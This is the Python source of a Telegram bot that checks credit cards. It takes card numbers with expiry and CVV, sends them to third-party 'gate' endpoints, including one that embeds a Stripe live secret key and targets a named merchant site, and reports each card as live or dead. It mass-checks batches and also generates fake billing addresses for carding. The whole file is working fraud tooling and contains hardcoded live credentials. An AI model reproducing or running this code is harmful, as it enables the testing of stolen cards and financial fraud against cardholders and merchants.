import telebot
import httpx
import re
import random
from telebot import types
from concurrent.futures import ThreadPoolExecutor

# --- CONFIG ---
TOKEN = "8318488317:AAF-76qS6IXP8fncpd2y9gpiEXwtzHOdOLY" 
bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
executor = ThreadPoolExecutor(max_workers=20)

# --- ACCURATE LOCALIZED DATA ---
NAMES = {
    "USA": {"fn": ["James", "Robert", "Emily"], "ln": ["Smith", "Miller", "Davis"], "flag": "🇺🇸", "zip": "10001", "st": "NY"},
    "UK": {"fn": ["Oliver", "George", "Amelia"], "ln": ["Taylor", "Davies", "Evans"], "flag": "🇬🇧", "zip": "SW1A 1AA", "st": "ENG"},
    "IN": {"fn": ["Arjun", "Aarav", "Priya"], "ln": ["Sharma", "Patel", "Iyer"], "flag": "🇮🇳", "zip": "400001", "st": "MH"},
    "DE": {"fn": ["Hans", "Lukas", "Mia"], "ln": ["Schmidt", "Müller", "Schneider"], "flag": "🇩🇪", "zip": "10115", "st": "BE"}
}

# --- KEYBOARDS ---
def main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(types.KeyboardButton("💳 Check Card"), types.KeyboardButton("🏠 Address Gen"))
    return markup

def gate_menu(cc_data):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("⚡ SK BASED", callback_data=f"gt|sk|{cc_data}"),
        types.InlineKeyboardButton("🔥 AUTOSTRIPE", callback_data=f"gt|as|{cc_data}"),
        types.InlineKeyboardButton("🚀 CHECK BOTH", callback_data=f"gt|both|{cc_data}")
    )
    return markup

# --- CORE API LOGIC ---
def call_api(gate, full_cc):
    try:
        # Sanitize input to ensure exact format CC|MM|YY|CVV
        full_cc = full_cc.strip().replace(" ", "")
        if gate == "sk":
            url = f"https://skbased.blinkop.online/?sk=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&amount=1&lista={full_cc}"
        else:
            url = f"https://autostripe.blinkop.online/check?gateway=autostripe&key=BlackXCard&site=chiwahwah.co.nz&cc={full_cc}"
        
        with httpx.Client(timeout=30.0, follow_redirects=True) as client:
            resp = client.get(url)
            text = resp.text.strip()
            low = text.lower()
            
            if any(x in low for x in ["success", "approved", "cvv live", "charged", "true"]):
                return f"✅ <b>LIVE:</b> <code>{text[:80]}</code>"
            elif "invalid" in low:
                return "⚠️ <b>INVALID FORMAT</b>"
            return f"❌ <b>DEAD:</b> <code>{text[:80]}</code>"
    except Exception:
        return "⚠️ <b>GATE OFFLINE</b>"

# --- HANDLERS ---

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "<b>💎 V1 PROFESSIONAL ACTIVE</b>\nReady for Single & Mass checking.", reply_markup=main_menu())

@bot.message_handler(func=lambda m: m.text == "💳 Check Card")
def prompt_check(message):
    bot.send_message(message.chat.id, "<b>📥 Send card(s) in format:</b>\n<code>CC|MM|YY|CVV</code>\n<i>(Send 1 for Gate Selection, or many for Mass Check)</i>")

@bot.message_handler(func=lambda m: m.text == "🏠 Address Gen")
def prompt_addr(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    btns = [types.InlineKeyboardButton(f"{v['flag']} {k}", callback_data=f"adr|{k}") for k, v in NAMES.items()]
    markup.add(*btns)
    bot.send_message(message.chat.id, "<b>🌍 Select Country:</b>", reply_markup=markup)

@bot.message_handler(func=lambda m: True)
def auto_checker(message):
    cards = re.findall(r'\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', message.text)
    if not cards:
        return

    if len(cards) == 1:
        # SINGLE CHECK - Show Gateway Options
        bot.reply_to(message, f"💳 <b>Single Detected:</b> <code>{cards[0]}</code>", reply_markup=gate_menu(cards[0]))
    else:
        # MASS CHECK - Automatic Processing
        status_msg = bot.reply_to(message, f"📂 <b>Mass Check:</b> {len(cards)} cards detected.\n<i>Processing via AutoStripe...</i>")
        
        # Parallel processing for speed
        with ThreadPoolExecutor(max_workers=10) as mass_executor:
            futures = [mass_executor.submit(call_api, "as", cc) for cc in cards[:15]] # Limit to 15 for safety
            results = [f"<code>{cards[i]}</code>\n┗ {f.result()}" for i, f in enumerate(futures)]
        
        final_report = "<b>📊 Mass Check Results:</b>\n\n" + "\n\n".join(results)
        bot.edit_message_text(final_report, status_msg.chat.id, status_msg.message_id)

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    p = call.data.split("|")
    
    if p[0] == "adr":
        c = NAMES[p[1]]
        fn, ln = random.choice(c["fn"]), random.choice(c["ln"])
        addr = (f"{c['flag']} <b>{p[1]} ACCURATE ADDR</b>\n━━━━━━━━━━━━━━\n"
                f"👤 <b>Name:</b> <code>{fn} {ln}</code>\n"
                f"🏠 <b>Street:</b> <code>{random.randint(10, 500)} {random.choice(['Main St', 'Oak Rd', 'High St'])}</code>\n"
                f"🏙 <b>City:</b> {c['city']}\n"
                f"📮 <b>Zip:</b> <code>{c['zip']}</code>\n━━━━━━━━━━━━━━")
        bot.edit_message_text(addr, call.message.chat.id, call.message.message_id)

    elif p[0] == "gt":
        gate, cc = p[1], p[2]
        bot.edit_message_text(f"⏳ <b>Checking:</b> <code>{cc}</code>", call.message.chat.id, call.message.message_id)
        
        if gate == "both":
            f1, f2 = executor.submit(call_api, "sk", cc), executor.submit(call_api, "as", cc)
            res = f"<b>Gate 1 (SK):</b> {f1.result()}\n<b>Gate 2 (AS):</b> {f2.result()}"
        else:
            res = f"<b>Result:</b> {call_api(gate, cc)}"
            
        bot.edit_message_text(f"<b>🏁 Finished</b>\n💳 <code>{cc}</code>\n━━━━━━━━━━━━━━\n{res}\n━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id)

# --- BOOT ---
print("✅ V1 Final is running with your Token...")
bot.infinity_polling(timeout=10, long_polling_timeout=5)
